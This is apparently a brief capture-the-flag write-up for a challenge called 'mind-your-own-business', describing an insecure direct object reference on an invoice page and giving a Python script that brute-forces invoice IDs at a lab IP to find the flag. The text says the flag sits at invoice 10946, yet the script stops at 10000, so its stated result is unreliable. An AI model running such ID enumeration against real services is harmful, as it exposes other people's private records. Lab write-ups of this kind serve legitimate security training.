Get the flag from mind-your-own-business.

We enter on the subscription page, then we fill in the credintials.
We observe after that after the creditential completion is good, the page redirect us to a invoice page.
If we change the invoice page index we then observe we get more invoicees but some of them are "Oops, no invoice".

So then we have to test all the invoices to check in which page we get the "SSS", which is at the page 10946. 


import requests
import re


start = 1
end = 10000

session = requests.Session()

for invoice_id in range(start, end + 1):
    url = f"http://141.85.224.70:8085/invoice.php?invoice={invoice_id}"
    print(f"🔎 Verific {url}")

    try:
        response = session.get(url, timeout=5)
    except Exception as e:
        print(f"⛔ Eroare la {url}: {e}")
        continue


    if "Oops! Invoice not found!" in response.text:
        continue


    match = re.search(r"SSS\{.*?\}", response.text)
    if match:
        flag = match.group(0)
        print(f"\n🎯 FLAG la invoice={invoice_id}: {flag}\n")


        with open(f"invoice_{invoice_id}.html", "w", encoding="utf-8") as f:
            f.write(response.text)

        break
